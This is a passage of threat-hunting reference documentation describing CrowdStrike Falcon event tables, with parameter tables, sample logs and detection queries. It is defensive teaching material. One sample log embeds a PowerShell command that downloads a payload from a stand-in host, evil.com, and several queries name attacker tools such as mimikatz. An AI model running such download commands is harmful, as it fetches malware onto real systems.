// Find applications accepting connections on a specific local IPv6 port
event_simpleName=NetworkReceiveAcceptIP6 LocalPort=443 Protocol=6

// Find incoming connections from a specific remote IPv6 address
event_simpleName=NetworkReceiveAcceptIP6 RemoteAddressIP6="fe80::cdef:1234:5678:90ab"

// Find all accepted UDP connections over IPv6
event_simpleName=NetworkReceiveAcceptIP6 Protocol=17

// Find connections accepted on a particular local IPv6 address and port
event_simpleName=NetworkReceiveAcceptIP6 LocalAddressIP6="fe80::abcd:ef12:3456:7890" LocalPort=80
```

---
## Crowdstrike Table: NewExecutableRenamed

### 1. Table Name

**NewExecutableRenamed**

---

### 2. Table Usage

This table is generated when an executable is renamed. This event is important for detecting potential attempts at masquerading malicious executables, evading detection, or altering system binaries on macOS and Windows platforms.

---

### 3. Important Parameter Description

| Parameter | Description | Platforms Affected |
|---|---|---|
| SourceFileName | The file's original name. | All |
| TargetFileName | The resulting file name after the rename operation. | All |

---

### 4. Sample Log Example

```json
{
  "SourceFileName": "C:\\Windows\\System32\\svchost.exe",
  "TargetFileName": "C:\\Windows\\Temp\\temp_svchost.exe"
}
```

---

### 5. Example Queries

```xql
// Find all executable rename events
event_simpleName=NewExecutableRenamed

// Find executable rename events for a specific source file name
event_simpleName=NewExecutableRenamed SourceFileName="*powershell.exe"

// Find executable rename events where the target file name indicates a suspicious location
event_simpleName=NewExecutableRenamed TargetFileName="*\\Users\\Public\\*"
```

---
## Crowdstrike Table: NewExecutableWritten

### 1. Table Name

**NewExecutableWritten**

---

### 2. Table Usage

This table is generated when an executable file extension is written, whether or not it is truly an executable file type. Any file that ends with a known executable file extension (e.g. .exe, .bat, .scr) will generate this event. The difference between a NewExecutableWritten event and PeFileWritten is that NewExecutableWritten looks for the extension of a file written, while PEFileWritten looks for the PE header in a file that was written. This event is useful for detecting potential malware drops, suspicious file creation, and persistence mechanisms across Linux, macOS, and Windows platforms.

---

### 3. Important Parameter Description

| Parameter | Description | Platforms Affected |
|---|---|---|
| ContextBaseFileName | The base name of the context file. | All |
| TargetFileName | The resulting file name that was written. | All |
| ContextImageFileName | The image file name of the process that generated the event. | Windows |

---

### 4. Sample Log Example

```json
{
  "ContextBaseFileName": "malware.exe",
  "TargetFileName": "C:\\Users\\user\\Downloads\\malware.exe",
  "ContextImageFileName": "C:\\Windows\\System32\\cmd.exe"
}
```

---

### 5. Example Queries

```xql
// Find all newly written executable files
event_simpleName=NewExecutableWritten

// Find newly written executable files with a specific target file name
event_simpleName=NewExecutableWritten TargetFileName="*temp_script.bat*"

// Find newly written executable files by the base name of the context file
event_simpleName=NewExecutableWritten ContextBaseFileName="installer.exe"

// Find newly written executable files where the context image file name indicates a suspicious origin (Windows only)
event_simpleName=NewExecutableWritten ContextImageFileName="*\\AppData\\Local\\Temp\\*"
```

---
## Crowdstrike Table: NewScriptWritten

### 1. Table Name

**NewScriptWritten**

---

### 2. Table Usage

This table is emitted when a process is done writing a script file, as determined by `#!` at the start of the file on Linux and macOS, or when a new script with extensions like .js, .aspx, .bat, .ps1, .vbs, .lua is written on Windows. This event is crucial for detecting the creation of suspicious scripts, which can indicate malware drops, persistence mechanisms, or unauthorized automation.

---

### 3. Important Parameter Description

| Parameter | Description | Platforms Affected |
|---|---|---|
| ContextBaseFileName | The base name of the context file. | All |
| TargetFileName | The resulting file name that was written. | All |
| ContextImageFileName | The image file name of the process that generated the event. | Windows |

---

### 4. Sample Log Example

```json
{
  "ContextBaseFileName": "malicious_script.ps1",
  "TargetFileName": "C:\\Temp\\malicious_script.ps1",
  "ContextImageFileName": "C:\\Windows\\System32\\cmd.exe"
}
```

---

### 5. Example Queries

```xql
// Find all newly written script files
event_simpleName=NewScriptWritten

// Find newly written script files with a specific target file name
event_simpleName=NewScriptWritten TargetFileName="*temp_script.sh*"

// Find newly written script files by the base name of the context file
event_simpleName=NewScriptWritten ContextBaseFileName="payload.js"

// Find newly written script files where the context image file name indicates a suspicious origin (Windows only)
event_simpleName=NewScriptWritten ContextImageFileName="*\\Users\\Public\\*"
```

---
## Crowdstrike Table: OleFileWritten

### 1. Table Name

**OleFileWritten**

---

### 2. Table Usage

This event is generated when a Microsoft Office (Pre-Office 2007) file type is written to disk. This table is useful for investigations into file creation, data exfiltration, and malware drops, especially concerning older Office document formats, across Windows, Linux, and macOS platforms.

---

### 3. Important Parameter Description

| Parameter | Description | Platforms Affected |
|---|---|---|
| ContextBaseFileName | The base name of the context file. | All |
| TargetFileName | The resulting file name that was downloaded. | All |
| IsOnNetwork | Set to true if the relevant file listed in the event is on a network drive. False otherwise. | Windows |
| IsOnRemovableDisk | If true, it means this file was located on a removable disk. | All |

---

### 4. Sample Log Example

```json
{
  "ContextBaseFileName": "legacy_document.doc",
  "TargetFileName": "C:\\Users\\user\\Documents\\legacy_document.doc",
  "IsOnNetwork": false,
  "IsOnRemovableDisk": false
}
```

---

### 5. Example Queries

```xql
// Find all OLE files written with a specific target file name
event_simpleName=OleFileWritten TargetFileName="*confidential_spreadsheet.xls*"

// Find OLE files written to a network drive (Windows only)
event_simpleName=OleFileWritten IsOnNetwork=true

// Find OLE files written to a removable disk
event_simpleName=OleFileWritten IsOnRemovableDisk=true

// Find OLE files based on their context base file name
event_simpleName=OleFileWritten ContextBaseFileName="old_report.ppt"
```

---
## Crowdstrike Table: OoxmlFileWritten

### 1. Table Name

**OoxmlFileWritten**

---

### 2. Table Usage

This table is generated when a Microsoft Office (Post-Office 2007) file type is written to disk. This event is crucial for investigations into file creation, data exfiltration, and malware drops, especially concerning newer Office Open XML formats, across Windows, Linux, and macOS platforms.

---

### 3. Important Parameter Description

| Parameter | Description | Platforms Affected |
|---|---|---|
| ContextBaseFileName | The base name of the context file. | All |
| TargetFileName | The resulting file name that was downloaded. | All |
| IsOnNetwork | Set to true if the relevant file listed in the event is on a network drive. False otherwise. | Windows |
| IsOnRemovableDisk | If true, it means this file was located on a removable disk. | All |

---

### 4. Sample Log Example

```json
{
  "ContextBaseFileName": "modern_report.docx",
  "TargetFileName": "C:\\Users\\user\\Documents\\modern_report.docx",
  "IsOnNetwork": false,
  "IsOnRemovableDisk": false
}
```

---

### 5. Example Queries

```xql
// Find all OOXML files written with a specific target file name
event_simpleName=OoxmlFileWritten TargetFileName="*quarterly_results.xlsx*"

// Find OOXML files written to a network drive (Windows only)
event_simpleName=OoxmlFileWritten IsOnNetwork=true

// Find OOXML files written to a removable disk
event_simpleName=OoxmlFileWritten IsOnRemovableDisk=true

// Find OOXML files based on their context base file name
event_simpleName=OoxmlFileWritten ContextBaseFileName="presentation.pptx"
```

---
## PackedExecutableWritten Table: Packed Executable Written Event

### 1. Table Name
**PackedExecutableWritten**

---

### 2. Table Usage
This event indicates that a packed executable was written to disk on a Windows host. Packers are often used by malware authors to obfuscate their code, making it harder for antivirus software and security analysts to examine. Monitoring the creation of packed files is a critical technique for identifying potentially malicious software that is attempting to evade static analysis.

---

### 3. Important Parameter Description

| Parameter | Description | Platforms Affected |
|---|---|---|
| TargetFileName | The full path to the packed executable file that was written to disk. | Windows Only |
| FileSubType | A numeric code indicating the type of packer detected. Common values include: `1` (ASPack), `2` (MPRESS), `3` (Themida), `4` (UPX), `5` (VMProtect). | Windows Only |

---

### 4. Sample Log Example

```json
{
  "TargetFileName": "C:\\Users\\admin\\AppData\\Local\\Temp\\packed_malware.exe",
  "FileSubType": "4"
}
```

---

### 5. Example Queries
```xql
// Find all events where a packed executable was written to disk
event_simpleName=PackedExecutableWritten

// Hunt for UPX-packed files being written, as this is a very common packer
event_simpleName=PackedExecutableWritten FileSubType=4

// Search for executables written to disk that were packed with Themida or VMProtect
event_simpleName=PackedExecutableWritten FileSubType IN (3, 5)

// Find packed executables written to a specific directory
event_simpleName=PackedExecutableWritten TargetFileName="*\\Downloads\\*"
```
---
## PdfFileWritten Table: File Written Event

### 1. Table Name
**PdfFileWritten**

---

### 2. Table Usage
This table records events when a process completes writing a PDF (Portable Document Format) file. While PDFs are a common document format, they can also be used as a vector for phishing attacks, containing malicious links or embedded exploits. Monitoring the creation of PDF files can be useful for investigating malware delivery and document-based threats.

---

### 3. Important Parameter Description

| Parameter | Description | Platforms Affected |
|---|---|---|
| TargetFileName | The resulting file name that was written. | All |
| IsOnNetwork | Set to true if the relevant file listed in the event is on a network drive; otherwise, it is false. | Windows Only |
| IsOnRemovableDisk | If true, it means this file was located on a removable disk. | Windows Only |
| FileOperatorSid | The Security Identifier (SID) of the file operator. | Windows Only |
| ContextBaseFileName | The base name of the context file. | All |

---

### 4. Sample Log Example

```json
{
  "TargetFileName": "C:\\Users\\user\\Downloads\\Malicious_Invoice.pdf",
  "IsOnNetwork": false,
  "IsOnRemovableDisk": false,
  "FileOperatorSid": "S-1-5-21-3623811015-3361044348-30300820-1013",
  "ContextBaseFileName": "Malicious_Invoice.pdf"
}
```
---

### 5. Example Queries

```xql
// Find all PDF files written to disk
event_simpleName=PdfFileWritten TargetFileName="*.pdf"

// Find PDF files written to a network drive (Windows only)
event_simpleName=PdfFileWritten IsOnNetwork=true

// Find PDF files written to a removable disk (Windows only)
event_simpleName=PdfFileWritten IsOnRemovableDisk=true

// Investigate PDF file writes by a specific file operator SID (Windows only)
event_simpleName=PdfFileWritten FileOperatorSid="S-1-5-21-12345-67890-*"

// Find PDF files with a potentially suspicious name like "invoice" or "password"
event_simpleName=PdfFileWritten ContextBaseFileName="*invoice*.pdf" OR ContextBaseFileName="*password*.pdf"
```
---
## PeFileWritten Table: PE File Written Event

### 1. Table Name
**PeFileWritten**

---

### 2. Table Usage
This event is generated when a Windows Portable Executable (PE) file, such as an .exe or .dll, is written to disk. This is a critical event for threat hunting because it often signifies malware being dropped onto a system, an attacker staging tools for later use, or "living-off-the-land" techniques where legitimate utilities are written to disk for malicious purposes. This event provides rich context about both the file that was written and the process that wrote it.

---

### 3. Important Parameter Description

| Parameter | Description | Platforms Affected |
|---|---|---|
| TargetFileName | The full path of the PE file that was written to disk. | All |
| ContextBaseFileName | The base name of the process that wrote the PE file. | All |
| ContextImageFileName | The full path of the process that wrote the PE file. | Windows Only |
| UserName | The user account that was active when the file was written. | All |
| IsOnNetwork | Set to true if the PE file was written to a network drive. False otherwise. | Windows Only |
| IsOnRemovableDisk | If true, it means the PE file was written to a removable disk. | All |
| FileOperatorSid | The Security Identifier (SID) of the user or entity that performed the file write operation. | Windows Only |
| ImageSubsystem | The subsystem required to run the PE file, such as GUI (`2`) or CUI (Console) (`3`). | Windows Only |
| ModuleCharacteristics | A bitmask of flags indicating the characteristics of the PE file, such as whether it's an executable (`2`) or a DLL (`8192`). | Windows Only |

---

### 4. Sample Log Example

```json
{
  "TargetFileName": "C:\\Users\\admin\\AppData\\Local\\Temp\\malicious.dll",
  "ContextBaseFileName": "powershell.exe",
  "ContextImageFileName": "C:\\Windows\\System32\\WindowsPowerShell\\v1.0\\powershell.exe",
  "UserName": "CORP\\admin",
  "IsOnNetwork": false,
  "IsOnRemovableDisk": false,
  "FileOperatorSid": "S-1-5-21-1234567890-123456789-1234567890-1001",
  "ImageSubsystem": "2",
  "ModuleCharacteristics": "8192"
}
```

---

### 5. Example Queries
```xql
// Find all PE files written to disk
event_simpleName=PeFileWritten

// Hunt for PE files written by scripting engines like PowerShell, which can indicate fileless attacks dropping a payload
event_simpleName=PeFileWritten ContextImageFileName IN ("*\\powershell.exe", "*\\wscript.exe", "*\\cscript.exe")

// Find PE files being written to suspicious locations like Temp or Public user directories
event_simpleName=PeFileWritten TargetFileName="*\\Temp\\*" OR TargetFileName="*\\Users\\Public\\*"

// Search for DLLs (ModuleCharacteristics=8192) being written, as they can be used for hijacking or sideloading
event_simpleName=PeFileWritten ModuleCharacteristics=8192

// Find PE files written to a removable disk, which might be used for data transfer or offline attacks
event_simpleName=PeFileWritten IsOnRemovableDisk=true
```
---
## PeFileWrittenDetectInfo Table: PE File Written Detection Event

### 1. Table Name
**PeFileWrittenDetectInfo**

---

### 2. Table Usage
This event is generated when a Portable Executable (PE) file, such as an .exe or .dll, is written to disk. This is a critical event for threat hunting, as it often signifies malware being dropped, an attacker staging tools, or "living-off-the-land" techniques where legitimate utilities are written to disk for malicious purposes. This event provides rich context about the file that was written and the process that wrote it.

---

### 3. Important Parameter Description

| Parameter | Description | Platforms Affected |
|---|---|---|
| ImageFileName | The full path of the PE file that was written to disk. | Windows Only |
| WritingProcessId | The Process ID of the process that wrote the PE file. | Windows Only |
| WritingProcessImageFileName | The name of the process that wrote the PE file. | Windows Only |
| WritingProcessCommandLine | The command line of the process that wrote the PE file. | Windows Only |
| ParentOfWritingProcessImageFileName | The name of the parent process of the writing process. | Windows Only |
| ParentOfWritingProcessCommandLine | The command line of the parent of the writing process. | Windows Only |
| OriginalFilename | The original filename of the PE file, extracted from its version information resource. | Windows Only |
| CompanyName | The company name from the PE file's version information. | Windows Only |
| FileVersion | The file version from the PE file's version information. | Windows Only |
| ImageSubsystem | The subsystem required to run the PE file, such as GUI (`2`) or CUI (`3`). | Windows Only |
| ModuleCharacteristics | A bitmask of flags indicating the characteristics of the PE file, such as if it's an executable (`2`) or a DLL (`8192`). | Windows Only |

---

### 4. Sample Log Example

```json
{
  "ImageFileName": "C:\\Users\\admin\\AppData\\Local\\Temp\\malicious.exe",
  "WritingProcessId": "4580",
  "WritingProcessImageFileName": "C:\\Windows\\System32\\WindowsPowerShell\\v1.0\\powershell.exe",
  "WritingProcessCommandLine": "powershell -c \"(New-Object Net.WebClient).DownloadFile('[http://evil.com/payload.exe](http://evil.com/payload.exe)', 'malicious.exe')\"",
  "ParentOfWritingProcessImageFileName": "C:\\Windows\\System32\\cmd.exe",
  "ParentOfWritingProcessCommandLine": "cmd.exe /c powershell...",
  "OriginalFilename": "payload.exe",
  "CompanyName": "Evil Corp",
  "FileVersion": "1.0.0.1",
  "ImageSubsystem": "2",
  "ModuleCharacteristics": "2"
}
```
---

### 5. Example Queries
```xql
// Find all PE file write detection events
event_simpleName=PeFileWrittenDetectInfo

// Hunt for PE files written by scripting engines like PowerShell or WScript
event_simpleName=PeFileWrittenDetectInfo WritingProcessImageFileName IN ("*\\powershell.exe", "*\\wscript.exe", "*\\cscript.exe")

// Find PE files being written to suspicious locations like Temp or Public user directories
event_simpleName=PeFileWrittenDetectInfo ImageFileName="*\\Temp\\*" OR ImageFileName="*\\Users\\Public\\*"

// Search for PE files written by a parent process of an Office application, which can indicate macro-based attacks
event_simpleName=PeFileWrittenDetectInfo ParentOfWritingProcessImageFileName IN ("*\\winword.exe", "*\\excel.exe")

// Find PE files with a specific original filename, regardless of what they were renamed to
event_simpleName=PeFileWrittenDetectInfo OriginalFilename="mimikatz.exe"
```## PngFileWritten Table: File Written Event

### 1. Table Name
**PngFileWritten**

---

### 2. Table Usage
This table records events when a process completes writing a PNG (Portable Network Graphics) image file. While PNG is a common and legitimate image format, monitoring its creation can be useful in specific threat hunting scenarios, such as detecting the exfiltration of sensitive information via screenshots or steganography, where data is hidden within an image file.

---

### 3. Important Parameter Description

| Parameter | Description | Platforms Affected |
|---|---|---|
| TargetFileName | The resulting file name that was written. | All |
| IsOnNetwork | Set to true if the relevant file listed in the event is on a network drive; otherwise, it is false. | Windows Only |
| IsOnRemovableDisk | If true, it means this file was located on a removable disk. | Windows Only |
| FileOperatorSid | The Security Identifier (SID) of the file operator. | Windows Only |
| ContextBaseFileName | The base name of the context file. | All |

---

### 4. Sample Log Example

```json
{
  "TargetFileName": "C:\\Users\\user\\Pictures\\Screenshots\\screenshot_2023-10-27.png",
  "IsOnNetwork": false,
  "IsOnRemovableDisk": false,
  "FileOperatorSid": "S-1-5-21-3623811015-3361044348-30300820-1013",
  "ContextBaseFileName": "screenshot_2023-10-27.png"
}
```
---

### 5. Example Queries
```xql
// Find all PNG files written to disk
event_simpleName=PngFileWritten TargetFileName="*.png"

// Find PNG files written to a network drive (Windows only)
event_simpleName=PngFileWritten IsOnNetwork=true

// Find PNG files written to a removable disk (Windows only)
event_simpleName=PngFileWritten IsOnRemovableDisk=true

// Investigate PNG file writes by a specific file operator SID (Windows only)
event_simpleName=PngFileWritten FileOperatorSid="S-1-5-21-12345-67890-*"

// Hunt for screenshot-related PNG files being created
event_simpleName=PngFileWritten ContextBaseFileName="*screenshot*"
```
---
## PrivilegedProcessHandleFromUnsignedModule Table: Privileged Process Handle from Unsigned Module Event

### 1. Table Name
**PrivilegedProcessHandleFromUnsignedModule**

---

### 2. Table Usage
This event is generated when an unsigned module creates a handle to a privileged process on a Windows host. Attackers often use unsigned DLLs to inject into and access the memory of sensitive processes like LSASS for credential theft. Monitoring this event is critical for detecting attempts by untrusted code to access privileged process memory.

---

### 3. Important Parameter Description

| Parameter | Description | Platforms Affected |
|---|---|---|
| ImageFileName | The full path to the unsigned module that created the handle. | Windows Only |
| FileSigningTime | The timestamp when the file was signed. For an unsigned module, this may be null or zero. | Windows Only |
| SignInfoFlags | A bitmask indicating the signature status of the module. A value of `512` (0x200) indicates the module has no signature. | Windows Only |

---

### 4. Sample Log Example

```json
{
  "ImageFileName": "C:\\Users\\admin\\AppData\\Local\\Temp\\malicious.dll",
  "FileSigningTime": "0",
  "SignInfoFlags": "512"
}
```

---

### 5. Example Queries
```xql
// Find all instances of privileged handles being created by unsigned modules
event_simpleName=PrivilegedProcessHandleFromUnsignedModule

// Hunt for a specific unsigned module by name
event_simpleName=PrivilegedProcessHandleFromUnsignedModule ImageFileName="*\\evil.dll"

// Find all modules that are explicitly flagged as having no signature
event_simpleName=PrivilegedProcessHandleFromUnsignedModule SignInfoFlags=512

// Investigate unsigned modules creating handles from a temp directory
event_simpleName=PrivilegedProcessHandleFromUnsignedModule ImageFileName="*\\Temp\\*"
```
---
## ProcessExecOnPackedExecutable Table: Packed Executable Execution Event

### 1. Table Name
**ProcessExecOnPackedExecutable**

---

### 2. Table Usage
This event is generated when a PE (Portable Executable) file that is known to be packed is executed on a Windows host. Packers are often used by malware authors to obfuscate their code, making it harder for antivirus software and security analysts to examine. Monitoring the execution of packed files is a critical technique for identifying potentially malicious software that is attempting to evade static analysis.

---

### 3. Important Parameter Description

| Parameter | Description | Platforms Affected |
|---|---|---|
| FileSubType | A numeric code indicating the type of packer detected. Common values include: `1` (ASPack), `2` (MPRESS), `3` (Themida), `4` (UPX), `5` (VMProtect). | Windows Only |

---

### 4. Sample Log Example

```json
{
  "FileSubType": "4"
}
```
---
### 5. Example Queries
```xql
// Find all executions of packed executables
event_simpleName=ProcessExecOnPackedExecutable

// Hunt for the execution of UPX-packed files, a very common packer
event_simpleName=ProcessExecOnPackedExecutable FileSubType=4

// Search for executables packed with Themida or VMProtect, which are often used in advanced malware
event_simpleName=ProcessExecOnPackedExecutable FileSubType IN (3, 5)
```
---
## ProcessExecOnRDPFile Table: RDP File Execution Event

### 1. Table Name
**ProcessExecOnRDPFile**

---

### 2. Table Usage
This event is generated when a PE (Portable Executable) file, which was written to the host via a Remote Desktop Protocol (RDP) session, is executed. Attackers who have gained RDP access often transfer their tools and malware to the victim's machine and then execute them. Monitoring this event is crucial for detecting malicious activity and lateral movement originating from RDP sessions.

---

### 3. Important Parameter Description

| Parameter | Description | Platforms Affected |
|---|---|---|
| TargetProcessId | The unique ID of the process that was executed from the RDP session. | Windows Only |

---

### 4. Sample Log Example

```json
{
  "TargetProcessId": "6212"
}
```

---

### 5. Example Queries
```xql
// Find all instances of a PE file being executed from an RDP session
event_simpleName=ProcessExecOnRDPFile

// Investigate a specific process ID that was executed via RDP
event_simpleName=ProcessExecOnRDPFile TargetProcessId="6212"
```
---
## ProcessExecOnSMBFile Table: Remote Execution from SMB Share Event

### 1. Table Name
**ProcessExecOnSMBFile**

---

### 2. Table Usage
This event is generated when a process executes a PE (Portable Executable) file that was written via SMB (Server Message Block). This is a very common technique used by attackers for lateral movement, allowing them to run tools and malware on remote systems without first writing them to the local disk. Monitoring this event is critical for detecting remote code execution and lateral movement attempts.

---

### 3. Important Parameter Description

| Parameter | Description | Platforms Affected |
|---|---|---|
| UserName | The name of the user account that executed the file from the SMB share. | Windows Only |
| UserSid | The Security Identifier (SID) of the user who performed the execution. | Windows Only |
| LogonDomain | The domain of the user account that initiated the execution. | Windows Only |
| RemoteAddressIP4 | The source IPv4 address from which the SMB connection originated, indicating the machine where the execution was initiated from. | Windows Only |

---

### 4. Sample Log Example

```json
{
  "UserName": "jsmith",
  "UserSid": "S-1-5-21-1234567890-123456789-1234567890-1001",
  "LogonDomain": "CORP",
  "RemoteAddressIP4": "10.0.5.25"
}
```

---

### 5. Example Queries

```xql
// Find all instances of a process executing from an SMB share
event_simpleName=ProcessExecOnSMBFile

// Hunt for executions originating from a specific remote IP address
event_simpleName=ProcessExecOnSMBFile RemoteAddressIP4="192.168.1.100"

// Find all remote executions performed by a specific user
event_simpleName=ProcessExecOnSMBFile UserName="*admin*"

// Investigate executions associated with a specific user SID
event_simpleName=ProcessExecOnSMBFile UserSid="S-1-5-21-1234567890-123456789-1234567890-500"

// Look for remote executions within a specific domain
event_simpleName=ProcessExecOnSMBFile LogonDomain="FINANCE"
```
---
## ProcessInjection Table: Process Injection Event

### 1. Table Name
**ProcessInjection**

---

### 2. Table Usage
This event is generated when a process writes and executes code within the address space of another process. Process injection is a powerful defense evasion and privilege escalation technique used extensively by malware to hide its malicious code within legitimate processes. Monitoring for these events is critical for detecting a wide range of advanced threats.

---

### 3. Important Parameter Description

| Parameter | Description | Platforms Affected |
|---|---|---|
| InjectorImageFileName | The full path to the executable of the process that is performing the injection. | Windows Only |
| InjecteeImageFileName | The full path to the executable of the process that is being injected into. | Windows Only |
| TargetProcessId | The unique ID of the process being injected into (the injectee). | Windows Only |
| ModuleName | If the injection involves a specific module, its name is captured here. This is common in techniques like DLL injection. | Windows Only |
| WellKnownTargetFunction | Identifies if the injection targets a well-known, specific function within the injectee process. | Windows Only |

---

### 4. Sample Log Example

```json
{
  "InjectorImageFileName": "C:\\Users\\admin\\AppData\\Local\\Temp\\malicious_loader.exe",
  "InjecteeImageFileName": "C:\\Windows\\System32\\explorer.exe",
  "TargetProcessId": "3456",
  "ModuleName": "C:\\Users\\admin\\AppData\\Local\\Temp\\payload.dll",
  "WellKnownTargetFunction": "0"
}
```

---

### 5. Example Queries

```xql
// Find all process injection events
event_simpleName=ProcessInjection

// Hunt for a specific legitimate process being injected into, like explorer.exe or svchost.exe
event_simpleName=ProcessInjection InjecteeImageFileName IN ("*\\explorer.exe", "*\\svchost.exe")

// Find injection attempts originating from processes running in suspicious locations
event_simpleName=ProcessInjection InjectorImageFileName="*\\Temp\\*" OR InjectorImageFileName="*\\Users\\Public\\*"

// Search for a specific malicious DLL being injected
event_simpleName=ProcessInjection ModuleName="*mimikatz*.dll"

// Investigate injection attempts targeting a specific process ID
event_simpleName=ProcessInjection TargetProcessId="1234"
```
---
## Crowdstrike Table: ProcessRollup2

### 1. Table Name

**ProcessRollup2**

---

### 2. Table Usage

This event (often called "PR2" for short) is generated for a process that is running or has finished running on a host and contains information about that process. For every ProcessRollup2 event, there is a corresponding event that is generated when a process completes. The name of this event is EndOfProcess for Windows and Mac and TerminateProcess for Linux. This event is crucial for understanding process execution, parent-child relationships, and identifying suspicious process activities across ChromeOS, Windows, macOS, Linux, Falcon Container, and Android platforms.

---

### 3. Important Parameter Description

| Parameter | Description | Platforms Affected |
|---|---|---|
| ParentBaseFileName | The base ImageFileName of the parent process. | Windows, macOS, Linux, Falcon Container |
| CommandLine | The command line used to create this process. May be empty in some circumstances. | All |
| ImageFileName | The full path to an executable (PE) file. For ProcessRollup2 events, this is the full path to the main executable for the created process. | All |
| ParentProcessId | The decimal representation of the parent process. | All |
| TargetProcessId | The unique ID of a target process (in decimal, non-hex format). This field exists in almost all events, and it represents the ID of the process that is responsible for the activity of the event in focus. | All |
| AuthenticationId | Values: INVALID\_LUID (0), NETWORK\_SERVICE (996), LOCAL\_SERVICE (997), SYSTEM (999), RESERVED\_LUID\_MAX (1000). | Windows |
| IntegrityLevel | Values: LOW (0x00001000), MEDIUM (0x00002000), MEDIUM\_PLUS (0x00002100), HIGH (0x00003000), SYSTEM (0x00004000), PROTECTED (0x00005000). | Windows |
| TokenType | Values: INVALID\_TOKEN (0), PRIMARY\_TOKEN (1), IMPERSONATION\_TOKEN (2). | Windows |

---

### 4. Sample Log Example

```json
{
  "ParentBaseFileName": "explorer.exe",
  "CommandLine": "cmd.exe /c whoami",
  "ImageFileName": "C:\\Windows\\System32\\cmd.exe",
  "ParentProcessId": 1234,
  "TargetProcessId": 5678,
  "AuthenticationId": 999,
  "IntegrityLevel": 12288,
  "TokenType": 1
}
```

---

### 5. Example Queries

```xql
// Find all ProcessRollup2 events
event_simpleName=ProcessRollup2

// Find processes launched by a specific parent process
event_simpleName=ProcessRollup2 ParentBaseFileName="powershell.exe"

// Find processes with a specific command line
event_simpleName=ProcessRollup2 CommandLine="*evil.exe*"

// Find processes based on their image file name
event_simpleName=ProcessRollup2 ImageFileName="*\\System32\\svchost.exe"

// Find processes with a specific integrity level (Windows only)
event_simpleName=ProcessRollup2 IntegrityLevel=16384 // SYSTEM integrity level

// Find processes with a specific authentication ID (Windows only)
event_simpleName=ProcessRollup2 AuthenticationId=997 // LOCAL_SERVICE

// Find processes with an impersonation token (Windows only)
event_simpleName=ProcessRollup2 TokenType=2
```

---
## ProcessSelfDeleted Table: Process Self-Deletion Event

### 1. Table Name
**ProcessSelfDeleted**

---

### 2. Table Usage
This event is generated when a process deletes its own executable file from disk. This is a common defense evasion technique used by malware to remove its tracks after it has successfully executed its payload, making forensic analysis more difficult. This event helps detect such clean-up activities.

---

### 3. Important Parameter Description

| Parameter | Description | Platforms Affected |
|---|---|---|
| ImageFileName | The full path to the executable file that was deleted by the process. | Windows |
| SourceProcessId | The process ID of the parent or creating process. In some self-deletion scenarios, this may be the same as the `TargetProcessId`. | Windows |
| TargetProcessId | The unique ID of the process that is deleting its own primary module. | Windows |

---

### 4. Sample Log Example

```json
{
  "ImageFileName": "C:\\Users\\admin\\AppData\\Local\\Temp\\malicious_installer.exe",
  "SourceProcessId": "1234",
  "TargetProcessId": "5678"
}
```

---

### 5. Example Queries

```xql
// Find all instances of a process self-deleting
event_simpleName=ProcessSelfDeleted

// Hunt for a specific executable that is known to self-delete
event_simpleName=ProcessSelfDeleted ImageFileName="*\\payload.exe"

// Find processes running from a temp directory that self-delete
event_simpleName=ProcessSelfDeleted ImageFileName="*\\Temp\\*"

// Investigate the relationship between the process that initiated the deletion and the process that was deleted
event_simpleName=ProcessSelfDeleted | table SourceProcessId, TargetProcessId, ImageFileName
```
---
## PythonFileWritten Table: File Written Event

### 1. Table Name
**PythonFileWritten**

---

### 2. Table Usage
This table records events when a process completes writing a Python script file (.py). Attackers often use Python scripts for a wide range of malicious activities, including reconnaissance, exploitation, and establishing backdoors. Monitoring the creation of these files is useful for investigating malware drops and the staging of attack tools.

---

### 3. Important Parameter Description

| Parameter | Description | Platforms Affected |
|---|---|---|
| TargetFileName | The resulting file name that was written. | All |
| IsOnNetwork | Set to true if the relevant file listed in the event is on a network drive; otherwise, it is false. | Windows Only |
| IsOnRemovableDisk | If true, it means this file was located on a removable disk. | Windows Only |
| FileOperatorSid | The Security Identifier (SID) of the file operator. | Windows Only |
| ContextBaseFileName | The base name of the context file. | All |

---

### 4. Sample Log Example

```json
{
  "TargetFileName": "C:\\Users\\user\\AppData\\Local\\Temp\\malicious_script.py",
  "IsOnNetwork": false,
  "IsOnRemovableDisk": false,
  "FileOperatorSid": "S-1-5-21-3623811015-3361044348-30300820-1013",
  "ContextBaseFileName": "malicious_script.py"
}
```

---

### 5. Example Queries
```xql
// Find all Python files written to disk
event_simpleName=PythonFileWritten TargetFileName="*.py"

// Find Python files written to a network drive (Windows only)
event_simpleName=PythonFileWritten IsOnNetwork=true

// Find Python files written to a removable disk (Windows only)
event_simpleName=PythonFileWritten IsOnRemovableDisk=true

// Investigate Python file writes by a specific file operator SID (Windows only)
event_simpleName=PythonFileWritten FileOperatorSid="S-1-5-21-12345-67890-*"

// Find Python scripts written to a temporary directory
event_simpleName=PythonFileWritten TargetFileName="*\\Temp\\*.py"
```
---
## QuarantinedFile Table: File Quarantine Event

### 1. Table Name
**QuarantinedFile**

---

### 2. Table Usage
This event is generated when a file is quarantined by Falcon Prevent. This is a critical remediation event, indicating that a malicious or suspicious file has been detected and neutralized by moving it to a secure location where it can no longer execute or be accessed. Monitoring these events is essential for confirming threat containment and understanding what malicious files have been found on hosts.

---

### 3. Important Parameter Description

| Parameter | Description | Platforms Affected |
|---|---|---|
| ImageFileName | The full original path to the executable or file that was quarantined. | All |
| IsOnRemovableDisk | A boolean value that is true if the quarantined file was originally located on a removable disk. | All |

---

### 4. Sample Log Example

```json
{
  "ImageFileName": "C:\\Users\\user\\Downloads\\malicious_payload.exe",
  "IsOnRemovableDisk": false
}
```

---

### 5. Example Queries
```xql
// Find all file quarantine events
event_simpleName=QuarantinedFile

// Hunt for a specific file that has been quarantined
event_simpleName=QuarantinedFile ImageFileName="*\\mimikatz.exe"

// Find all files that were quarantined from removable media
event_simpleName=QuarantinedFile IsOnRemovableDisk=true

// Find quarantined files in a specific user's download folder
event_simpleName=QuarantinedFile ImageFileName="*\\Downloads\\*"
```
---
## QuarantinedFileState Table: Quarantined File State Event

### 1. Table Name
**QuarantinedFileState**

---

### 2. Table Usage
This event reports the state of a file that has been quarantined by Falcon Prevent. It is used to track whether a file is currently quarantined, has been released, or has been deleted. This is crucial for confirming that a threat has been successfully neutralized and for auditing any changes to the status of quarantined files, such as an accidental or malicious release.

---

### 3. Important Parameter Description

| Parameter | Description | Platforms Affected |
|---|---|---|
| ImageFileName | The full original path to the executable or file that was quarantined. | All |
| QuarantinedFileName | The name or path of the file within the quarantine storage. | All |
